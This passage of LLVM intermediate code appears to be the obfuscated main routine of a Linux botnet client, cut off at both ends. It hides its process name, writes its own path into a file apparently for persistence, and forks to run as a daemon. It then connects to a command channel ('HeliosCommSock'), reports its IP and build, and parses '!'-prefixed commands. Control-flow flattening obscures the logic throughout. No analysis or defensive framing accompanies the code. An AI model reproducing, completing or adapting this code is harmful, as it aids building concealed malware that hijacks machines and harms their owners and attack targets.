  %19 = alloca [4096 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32*, align 8
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  %29 = alloca i32, align 4
  %30 = alloca [10 x i8*], align 16
  %31 = alloca i32, align 4
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %6, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 0
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i8* @strncpy(i8* %36, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i64 %40) #2
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.409, i32 0, i32 0), i8** %43, align 8
  %44 = load i8*, i8** %6, align 8
  %45 = ptrtoint i8* %44 to i64
  %46 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %45, i32 0, i32 0, i32 0)
  %47 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %48 = call i32 @getpid() #2
  %49 = xor i32 %47, %48
  call void @srand(i32 %49) #2
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = call i32 @getpid() #2
  %52 = xor i32 %50, %51
  call void @init_rand(i32 %52)
  store i32 0, i32* %10, align 4
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.410, i32 0, i32 0), i8** %12, align 8
  %53 = load i8*, i8** %12, align 8
  %54 = call %struct._IO_FILE* @fopen(i8* %53, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %54, %struct._IO_FILE** %13, align 8
  %55 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  store %struct._IO_FILE* %55, %struct._IO_FILE** %.reg2mem
  %switchVar = alloca i32
  store i32 -62423433, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i1
  %.reg2mem6 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -62423433, label %first
    i32 135638885, label %58
    i32 644749681, label %61
    i32 -60087214, label %65
    i32 -1589197413, label %77
    i32 -575042099, label %78
    i32 985964618, label %89
    i32 -2139251976, label %92
    i32 -1486912040, label %102
    i32 -281243215, label %108
    i32 -1335218766, label %117
    i32 -1167850757, label %120
    i32 -1012254518, label %121
    i32 -1694191017, label %125
    i32 1571522512, label %133
    i32 -1068362499, label %139
    i32 50461988, label %140
    i32 1461825586, label %143
    i32 -1292849094, label %144
    i32 1083136475, label %147
    i32 446710111, label %148
    i32 847520451, label %153
    i32 1745329320, label %156
    i32 -1497939862, label %160
    i32 1889695228, label %164
    i32 -1491311659, label %165
    i32 378521199, label %169
    i32 -597639794, label %170
    i32 911034684, label %172
    i32 1121658113, label %173
    i32 225567841, label %174
    i32 -793846805, label %176
    i32 -1367355272, label %177
    i32 536053583, label %181
    i32 1997346476, label %185
    i32 905688650, label %187
    i32 -1655982938, label %193
    i32 985646717, label %199
    i32 -1541001433, label %200
    i32 1858513757, label %206
    i32 -864105609, label %215
    i32 -1979134706, label %218
    i32 -1324292312, label %224
    i32 1537994729, label %235
    i32 -230405638, label %238
    i32 -1509023390, label %251
    i32 1450531067, label %257
    i32 -379868522, label %267
    i32 2021036461, label %270
    i32 1189165411, label %274
    i32 -123414853, label %275
    i32 1708361934, label %278
    i32 -511038725, label %288
    i32 946227660, label %289
    i32 2006796245, label %295
    i32 81072830, label %302
    i32 -122545907, label %303
    i32 -930208016, label %304
    i32 1381083908, label %311
    i32 1266374216, label %314
    i32 58941001, label %320
    i32 -214681794, label %325
    i32 -677703696, label %327
    i32 2057554796, label %330
    i32 -1307126788, label %336
    i32 -983587268, label %337
    i32 1776951074, label %346
    i32 1946391305, label %356
    i32 1343636149, label %365
    i32 371533111, label %367
    i32 -686041628, label %373
    i32 -1530442272, label %375
    i32 722687067, label %381
    i32 -873064505, label %386
    i32 -786535773, label %388
    i32 -709590813, label %391
    i32 -1851420990, label %396
    i32 1445567391, label %401
    i32 -1357015430, label %410
    i32 -726439387, label %415
    i32 -564384946, label %419
    i32 -2130452729, label %420
    i32 -1263489376, label %427
    i32 -936033318, label %433
    i32 216338698, label %437
    i32 175806887, label %440
    i32 1467369621, label %445
    i32 611533262, label %449
    i32 -122633652, label %455
    i32 -1099613883, label %478
    i32 2135501733, label %480
    i32 2066024746, label %486
    i32 -2102913557, label %487
    i32 -1266677210, label %492
    i32 1080928369, label %497
    i32 684842587, label %500
    i32 1804578726, label %501
    i32 242720669, label %502
    i32 -1205285425, label %503
    i32 -777744, label %504
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile %struct._IO_FILE*, %struct._IO_FILE** %.reg2mem
  %56 = icmp eq %struct._IO_FILE* %.reload, null
  %57 = select i1 %56, i32 135638885, i32 644749681
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.412, i32 0, i32 0), i8** %12, align 8
  %59 = load i8*, i8** %12, align 8
  %60 = call %struct._IO_FILE* @fopen(i8* %59, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store %struct._IO_FILE* %60, %struct._IO_FILE** %13, align 8
  store i32 644749681, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %63 = icmp ne %struct._IO_FILE* %62, null
  %64 = select i1 %63, i32 -60087214, i32 446710111
  store i32 %64, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i64 @strlen(i8* %68) #10
  %70 = trunc i64 %69 to i32
  store i32 %70, i32* %16, align 4
  store i32 0, i32* %17, align 4
  %71 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %72 = call i8* @getcwd(i8* %71, i64 256) #2
  %73 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %74 = call i32 @strcmp(i8* %73, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #10
  %75 = icmp ne i32 %74, 0
  %76 = select i1 %75, i32 -1589197413, i32 -1292849094
  store i32 %76, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  store i32 -575042099, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 0
  %81 = load i8*, i8** %80, align 8
  %82 = load i32, i32* %16, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = sext i8 %85 to i32
  %87 = icmp ne i32 %86, 47
  %88 = select i1 %87, i32 985964618, i32 -2139251976
  store i32 %88, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %16, align 4
  %91 = add nsw i32 %90, -1
  store i32 %91, i32* %16, align 4
  store i32 -575042099, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %94 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i32 0, i32 0
  %95 = load i8**, i8*** %5, align 8
  %96 = getelementptr inbounds i8*, i8** %95, i64 0
  %97 = load i8*, i8** %96, align 8
  %98 = load i32, i32* %16, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i8, i8* %97, i64 %99
  %101 = call i32 (i8*, i8*, ...) @sprintf(i8* %93, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.414, i32 0, i32 0), i8* %94, i8* %100) #2
  store i32 -1486912040, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %104 = call i32 @feof(%struct._IO_FILE* %103) #2
  %105 = icmp ne i32 %104, 0
  %106 = xor i1 %105, true
  %107 = select i1 %106, i32 -281243215, i32 -1012254518
  store i32 %107, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %110 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %111 = call i8* @fgets(i8* %109, i32 1024, %struct._IO_FILE* %110)
  %112 = getelementptr inbounds [1024 x i8], [1024 x i8]* %15, i32 0, i32 0
  %113 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %114 = call i32 @strcasecmp(i8* %112, i8* %113) #10
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 -1167850757, i32 -1335218766
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %17, align 4
  %119 = add nsw i32 %118, 1
  store i32 %119, i32* %17, align 4
  store i32 -1167850757, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1486912040, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load i32, i32* %17, align 4
  %123 = icmp eq i32 %122, 0
  %124 = select i1 %123, i32 -1694191017, i32 50461988
  store i32 %124, i32* %switchVar
  br label %loopEnd

; <label>:125:                                    ; preds = %loopEntry
  %126 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %127 = call i32 @fclose(%struct._IO_FILE* %126)
  %128 = load i8*, i8** %12, align 8
  %129 = call %struct._IO_FILE* @fopen(i8* %128, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.415, i32 0, i32 0))
  store %struct._IO_FILE* %129, %struct._IO_FILE** %18, align 8
  %130 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %131 = icmp ne %struct._IO_FILE* %130, null
  %132 = select i1 %131, i32 1571522512, i32 -1068362499
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = getelementptr inbounds [256 x i8], [256 x i8]* %14, i32 0, i32 0
  %135 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %136 = call i32 @fputs(i8* %134, %struct._IO_FILE* %135)
  %137 = load %struct._IO_FILE*, %struct._IO_FILE** %18, align 8
  %138 = call i32 @fclose(%struct._IO_FILE* %137)
  store i32 -1068362499, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  store i32 1461825586, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %142 = call i32 @fclose(%struct._IO_FILE* %141)
  store i32 1461825586, i32* %switchVar
  br label %loopEnd

; <label>:143:                                    ; preds = %loopEntry
  store i32 1083136475, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  %145 = load %struct._IO_FILE*, %struct._IO_FILE** %13, align 8
  %146 = call i32 @fclose(%struct._IO_FILE* %145)
  store i32 1083136475, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 446710111, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = call i32 @getOurIP()
  %150 = call i32 @fork() #2
  store i32 %150, i32* %7, align 4
  %151 = icmp ne i32 %150, 0
  %152 = select i1 %151, i32 847520451, i32 1745329320
  store i32 %152, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  %154 = load i32, i32* %7, align 4
  %155 = call i32 @waitpid(i32 %154, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %7, align 4
  %158 = icmp ne i32 %157, 0
  %159 = select i1 %158, i32 225567841, i32 -1497939862
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call i32 @fork() #2
  store i32 %161, i32* %8, align 4
  %162 = icmp ne i32 %161, 0
  %163 = select i1 %162, i32 1889695228, i32 -1491311659
  store i32 %163, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:165:                                    ; preds = %loopEntry
  %166 = load i32, i32* %8, align 4
  %167 = icmp ne i32 %166, 0
  %168 = select i1 %167, i32 -597639794, i32 378521199
  store i32 %168, i32* %switchVar
  br label %loopEnd

; <label>:169:                                    ; preds = %loopEntry
  store i32 911034684, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  store i32 911034684, i32* %switchVar
  br label %loopEnd

; <label>:172:                                    ; preds = %loopEntry
  store i32 1121658113, i32* %switchVar
  br label %loopEnd

; <label>:173:                                    ; preds = %loopEntry
  store i32 -793846805, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.416, i32 0, i32 0))
  store i32 -793846805, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 -1367355272, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = call i32 @setsid() #2
  %179 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.413, i32 0, i32 0)) #2
  %180 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  store i32 536053583, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = call i32 @initConnection()
  %183 = icmp ne i32 %182, 0
  %184 = select i1 %183, i32 1997346476, i32 905688650
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = call i32 @sleep(i32 30)
  store i32 536053583, i32* %switchVar
  br label %loopEnd

; <label>:187:                                    ; preds = %loopEntry
  %188 = load i32, i32* @HeliosCommSock, align 4
  %189 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %190 = call i8* @inet_ntoa(i32 %189) #2
  %191 = call i8* @getBuild()
  %192 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %188, i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.417, i32 0, i32 0), i8* %190, i8* %191)
  store i32 0, i32* %20, align 4
  store i32 0, i32* %21, align 4
  store i32 -1655982938, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* @HeliosCommSock, align 4
  %195 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %196 = call i32 @recvLine(i32 %194, i8* %195, i32 4096)
  store i32 %196, i32* %20, align 4
  %197 = icmp ne i32 %196, -1
  %198 = select i1 %197, i32 985646717, i32 -1205285425
  store i32 %198, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  store i32 0, i32* %21, align 4
  store i32 -1541001433, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = load i32, i32* %21, align 4
  %202 = sext i32 %201 to i64
  %203 = load i64, i64* @numpids, align 8
  %204 = icmp ult i64 %202, %203
  %205 = select i1 %204, i32 1858513757, i32 1708361934
  store i32 %205, i32* %switchVar
  br label %loopEnd

; <label>:206:                                    ; preds = %loopEntry
  %207 = load i32*, i32** @pids, align 8
  %208 = load i32, i32* %21, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds i32, i32* %207, i64 %209
  %211 = load i32, i32* %210, align 4
  %212 = call i32 @waitpid(i32 %211, i32* null, i32 1)
  %213 = icmp sgt i32 %212, 0
  %214 = select i1 %213, i32 -864105609, i32 1189165411
  store i32 %214, i32* %switchVar
  br label %loopEnd

; <label>:215:                                    ; preds = %loopEntry
  %216 = load i32, i32* %21, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %23, align 4
  store i32 -1979134706, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = load i32, i32* %23, align 4
  %220 = zext i32 %219 to i64
  %221 = load i64, i64* @numpids, align 8
  %222 = icmp ult i64 %220, %221
  %223 = select i1 %222, i32 -1324292312, i32 -230405638
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32*, i32** @pids, align 8
  %226 = load i32, i32* %23, align 4
  %227 = zext i32 %226 to i64
  %228 = getelementptr inbounds i32, i32* %225, i64 %227
  %229 = load i32, i32* %228, align 4
  %230 = load i32*, i32** @pids, align 8
  %231 = load i32, i32* %23, align 4
  %232 = sub i32 %231, 1
  %233 = zext i32 %232 to i64
  %234 = getelementptr inbounds i32, i32* %230, i64 %233
  store i32 %229, i32* %234, align 4
  store i32 1537994729, i32* %switchVar
  br label %loopEnd

; <label>:235:                                    ; preds = %loopEntry
  %236 = load i32, i32* %23, align 4
  %237 = add i32 %236, 1
  store i32 %237, i32* %23, align 4
  store i32 -1979134706, i32* %switchVar
  br label %loopEnd

; <label>:238:                                    ; preds = %loopEntry
  %239 = load i32*, i32** @pids, align 8
  %240 = load i32, i32* %23, align 4
  %241 = sub i32 %240, 1
  %242 = zext i32 %241 to i64
  %243 = getelementptr inbounds i32, i32* %239, i64 %242
  store i32 0, i32* %243, align 4
  %244 = load i64, i64* @numpids, align 8
  %245 = add i64 %244, -1
  store i64 %245, i64* @numpids, align 8
  %246 = load i64, i64* @numpids, align 8
  %247 = add i64 %246, 1
  %248 = mul i64 %247, 4
  %249 = call noalias i8* @malloc(i64 %248) #2
  %250 = bitcast i8* %249 to i32*
  store i32* %250, i32** %22, align 8
  store i32 0, i32* %23, align 4
  store i32 -1509023390, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i32, i32* %23, align 4
  %253 = zext i32 %252 to i64
  %254 = load i64, i64* @numpids, align 8
  %255 = icmp ult i64 %253, %254
  %256 = select i1 %255, i32 1450531067, i32 2021036461
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32*, i32** @pids, align 8
  %259 = load i32, i32* %23, align 4
  %260 = zext i32 %259 to i64
  %261 = getelementptr inbounds i32, i32* %258, i64 %260
  %262 = load i32, i32* %261, align 4
  %263 = load i32*, i32** %22, align 8
  %264 = load i32, i32* %23, align 4
  %265 = zext i32 %264 to i64
  %266 = getelementptr inbounds i32, i32* %263, i64 %265
  store i32 %262, i32* %266, align 4
  store i32 -379868522, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i32, i32* %23, align 4
  %269 = add i32 %268, 1
  store i32 %269, i32* %23, align 4
  store i32 -1509023390, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32*, i32** @pids, align 8
  %272 = bitcast i32* %271 to i8*
  call void @free(i8* %272) #2
  %273 = load i32*, i32** %22, align 8
  store i32* %273, i32** @pids, align 8
  store i32 1189165411, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 -123414853, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i32, i32* %21, align 4
  %277 = add nsw i32 %276, 1
  store i32 %277, i32* %21, align 4
  store i32 -1541001433, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %20, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %280
  store i8 0, i8* %281, align 1
  %282 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %282)
  %283 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %284 = call i8* @strstr(i8* %283, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %285 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %286 = icmp eq i8* %284, %285
  %287 = select i1 %286, i32 -511038725, i32 946227660
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  store i32 -1655982938, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %291 = call i8* @strstr(i8* %290, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.418, i32 0, i32 0)) #10
  %292 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %293 = icmp eq i8* %291, %292
  %294 = select i1 %293, i32 2006796245, i32 -930208016
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = load i32, i32* %10, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %10, align 4
  %298 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.419, i32 0, i32 0))
  %299 = load i32, i32* %10, align 4
  %300 = icmp sgt i32 %299, 20
  %301 = select i1 %300, i32 81072830, i32 -122545907
  store i32 %301, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:303:                                    ; preds = %loopEntry
  store i32 -1205285425, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %305, i8** %24, align 8
  %306 = load i8*, i8** %24, align 8
  %307 = load i8, i8* %306, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 33
  %310 = select i1 %309, i32 1381083908, i32 242720669
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8*, i8** %24, align 8
  %313 = getelementptr inbounds i8, i8* %312, i64 1
  store i8* %313, i8** %25, align 8
  store i32 1266374216, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i8*, i8** %25, align 8
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i32
  %318 = icmp ne i32 %317, 32
  %319 = select i1 %318, i32 58941001, i32 -214681794
  store i32 %319, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load i8*, i8** %25, align 8
  %322 = load i8, i8* %321, align 1
  %323 = zext i8 %322 to i32
  %324 = icmp ne i32 %323, 0
  store i32 -214681794, i32* %switchVar
  store i1 %324, i1* %.reg2mem2
  br label %loopEnd

; <label>:325:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %326 = select i1 %.reload3, i32 -677703696, i32 2057554796
  store i32 %326, i32* %switchVar
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %328 = load i8*, i8** %25, align 8
  %329 = getelementptr inbounds i8, i8* %328, i32 1
  store i8* %329, i8** %25, align 8
  store i32 1266374216, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i8*, i8** %25, align 8
  %332 = load i8, i8* %331, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp eq i32 %333, 0
  %335 = select i1 %334, i32 -1307126788, i32 -983587268
  store i32 %335, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  store i32 -1655982938, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i8*, i8** %25, align 8
  store i8 0, i8* %338, align 1
  %339 = load i8*, i8** %24, align 8
  %340 = getelementptr inbounds i8, i8* %339, i64 1
  store i8* %340, i8** %25, align 8
  %341 = load i8*, i8** %24, align 8
  %342 = load i8*, i8** %25, align 8
  %343 = call i64 @strlen(i8* %342) #10
  %344 = getelementptr inbounds i8, i8* %341, i64 %343
  %345 = getelementptr inbounds i8, i8* %344, i64 2
  store i8* %345, i8** %24, align 8
  store i32 1776951074, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i8*, i8** %24, align 8
  %348 = load i8*, i8** %24, align 8
  %349 = call i64 @strlen(i8* %348) #10
  %350 = sub i64 %349, 1
  %351 = getelementptr inbounds i8, i8* %347, i64 %350
  %352 = load i8, i8* %351, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp eq i32 %353, 10
  %355 = select i1 %354, i32 1343636149, i32 1946391305
  store i32 %355, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  %357 = load i8*, i8** %24, align 8
  %358 = load i8*, i8** %24, align 8
  %359 = call i64 @strlen(i8* %358) #10
  %360 = sub i64 %359, 1
  %361 = getelementptr inbounds i8, i8* %357, i64 %360
  %362 = load i8, i8* %361, align 1
  %363 = zext i8 %362 to i32
  %364 = icmp eq i32 %363, 13
  store i32 1343636149, i32* %switchVar
  store i1 %364, i1* %.reg2mem4
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %.reload5 = load i1, i1* %.reg2mem4
  %366 = select i1 %.reload5, i32 371533111, i32 -686041628
  store i32 %366, i32* %switchVar
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %368 = load i8*, i8** %24, align 8
  %369 = load i8*, i8** %24, align 8
  %370 = call i64 @strlen(i8* %369) #10
  %371 = sub i64 %370, 1
  %372 = getelementptr inbounds i8, i8* %368, i64 %371
  store i8 0, i8* %372, align 1
  store i32 1776951074, i32* %switchVar
  br label %loopEnd

; <label>:373:                                    ; preds = %loopEntry
  %374 = load i8*, i8** %24, align 8
  store i8* %374, i8** %26, align 8
  store i32 -1530442272, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i8*, i8** %24, align 8
  %377 = load i8, i8* %376, align 1
  %378 = zext i8 %377 to i32
  %379 = icmp ne i32 %378, 32
  %380 = select i1 %379, i32 722687067, i32 -873064505
  store i32 %380, i32* %switchVar
  store i1 false, i1* %.reg2mem6
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i8*, i8** %24, align 8
  %383 = load i8, i8* %382, align 1
  %384 = zext i8 %383 to i32
  %385 = icmp ne i32 %384, 0
  store i32 -873064505, i32* %switchVar
  store i1 %385, i1* %.reg2mem6
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %.reload7 = load i1, i1* %.reg2mem6
  %387 = select i1 %.reload7, i32 -786535773, i32 -709590813
  store i32 %387, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load i8*, i8** %24, align 8
  %390 = getelementptr inbounds i8, i8* %389, i32 1
  store i8* %390, i8** %24, align 8
  store i32 -1530442272, i32* %switchVar
  br label %loopEnd

; <label>:391:                                    ; preds = %loopEntry
  %392 = load i8*, i8** %24, align 8
  store i8 0, i8* %392, align 1
  %393 = load i8*, i8** %24, align 8
  %394 = getelementptr inbounds i8, i8* %393, i32 1
  store i8* %394, i8** %24, align 8
  %395 = load i8*, i8** %26, align 8
  store i8* %395, i8** %27, align 8
  store i32 -1851420990, i32* %switchVar
  br label %loopEnd

; <label>:396:                                    ; preds = %loopEntry
  %397 = load i8*, i8** %27, align 8
  %398 = load i8, i8* %397, align 1
  %399 = icmp ne i8 %398, 0
  %400 = select i1 %399, i32 1445567391, i32 -1357015430
  store i32 %400, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i8*, i8** %27, align 8
  %403 = load i8, i8* %402, align 1
  %404 = zext i8 %403 to i32
  %405 = call i32 @toupper(i32 %404) #10
  %406 = trunc i32 %405 to i8
  %407 = load i8*, i8** %27, align 8
  store i8 %406, i8* %407, align 1
  %408 = load i8*, i8** %27, align 8
  %409 = getelementptr inbounds i8, i8* %408, i32 1
  store i8* %409, i8** %27, align 8
  store i32 -1851420990, i32* %switchVar
  br label %loopEnd

; <label>:410:                                    ; preds = %loopEntry
  %411 = load i8*, i8** %26, align 8
